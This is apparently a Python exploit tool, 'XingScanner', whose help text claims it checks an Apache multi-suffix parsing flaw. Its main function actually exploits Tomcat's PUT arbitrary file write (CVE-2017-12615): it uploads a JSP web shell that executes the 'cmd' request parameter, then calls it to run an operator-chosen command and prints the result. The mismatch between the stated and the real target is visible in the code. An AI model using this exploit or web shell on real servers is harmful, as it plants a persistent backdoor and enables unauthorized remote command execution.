import argparse
import random
import sys
from urllib.parse import urlparse

import requests
from colorama import Fore, Style


def create_parser():
    """创建并配置参数解析器"""

    parser = argparse.ArgumentParser(
        prog="XingScanner",
        description="Apache 多后缀解析漏洞检测工具",
        epilog=f"{Fore.GREEN}Created by Mahua | 仅限授权测试使用{Style.RESET_ALL}",
        formatter_class=argparse.RawTextHelpFormatter,
        add_help=False
    )

    # 必选参数组
    required = parser.add_argument_group(f"{Fore.YELLOW}必选参数{Style.RESET_ALL}")
    required.add_argument("-t", "--target",
                          required=True,
                          help=f"目标URL (示例: {Fore.BLUE}http://target.com/upload.php{Style.RESET_ALL})")

    # 可选参数组
    optional = parser.add_argument_group(f"{Fore.CYAN}可选参数{Style.RESET_ALL}")
    optional.add_argument("-c", "--command",
                          default="whoami",
                          help=f"要执行的系统命令 (默认: {Fore.GREEN}%(default)s{Style.RESET_ALL})")
    optional.add_argument("-o", "--output",
                          type=argparse.FileType('w'),
                          help="结果输出文件路径")
    optional.add_argument("-v", "--verbose",
                          action="count",
                          default=0,
                          help="详细模式 (-v 详细信息, -vv 调试输出)")
    optional.add_argument("-h", "--help",
                          action="store_true",
                          help="显示帮助信息")

    return parser


def precheck_arguments(parser):
    """预处理帮助请求和空参数场景"""

    # 显式帮助请求优先
    if any(arg in sys.argv for arg in ('-h', '--help')):
        parser.print_help()
        sys.exit(0)

    # 空参数场景处理
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(0)


def check_vulnerability(url, command):
    """Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）"""

    arg_url = urlparse(url)
    base_url = f'{arg_url.scheme}://{arg_url.netloc}/'
    # rand_str = ''.join(random.choices('qwertyuiopasdfghjklzxcvbnm', k=6))
    target_url = f'{base_url}1.jsp/'
    data = """
    <% 
        if(request.getParameter("cmd") != null) {
            Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
            java.io.InputStream in = p.getInputStream();
            int a = -1;
            byte[] b = new byte[1024];
            out.print("<pre>");
            while ((a = in.read(b)) != -1) {
                out.println(new String(b, 0, a));
            }
            out.print("</pre>");
        }
    %>
    """
    data = data.encode()

    response = requests.put(target_url, data=data, verify=False)
    print(response.status_code)
    webshell_url = f'{base_url}1.jsp?cmd={command}'
    print(webshell_url)
    response = requests.get(webshell_url, verify=False)
    print(response.status_code)
    if response.status_code == 200:
        print(f'{Fore.GREEN}{response.text}{Style.RESET_ALL}')
        print(f'{Fore.BLUE}{command}命令成功执行，可使用"-c"参数指定执行命令{Style.RESET_ALL}')
        print('\n')
    else:
        print(response.status_code)


def main():
    parser = create_parser()
    precheck_arguments(parser)
    args = parser.parse_args()
    check_vulnerability(args.target, args.command)


if __name__ == '__main__':
    main()